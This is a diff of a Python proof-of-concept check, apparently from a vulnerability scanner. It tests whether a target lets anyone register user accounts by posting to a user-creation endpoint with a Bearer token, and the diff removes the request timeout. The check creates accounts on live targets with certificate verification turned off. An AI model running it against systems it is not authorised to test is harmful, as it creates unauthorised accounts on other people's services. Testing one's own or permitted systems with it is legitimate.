@@ -62,7 +62,7 @@ class poc:
         self.headers["Authorization"] = "Bearer {}".format(token)
         self.headers["Connection"] = "close"
         try:
-            result = requests.post(url=url, data=data, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
+            result = requests.post(url=url, data=data, headers=self.headers, verify=False, proxies=self.proxies)
             if "create user ok" in result.text or "already exist" in result.text:
                 target = urlparse(url)
                 self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意用户注册漏洞\033[0m
@@ -77,7 +77,7 @@ class poc:
                 return True
             elif result.status_code == 404:
                 url1 = "{}://{}/v1/auth/users".format(scheme, netloc)
-                result = requests.post(url=url1, data=data, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
+                result = requests.post(url=url1, data=data, headers=self.headers, verify=False, proxies=self.proxies)
                 if "create user ok" in result.text or "already exist" in result.text:
                     target = urlparse(url1)
                     self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意用户注册漏洞\033[0m
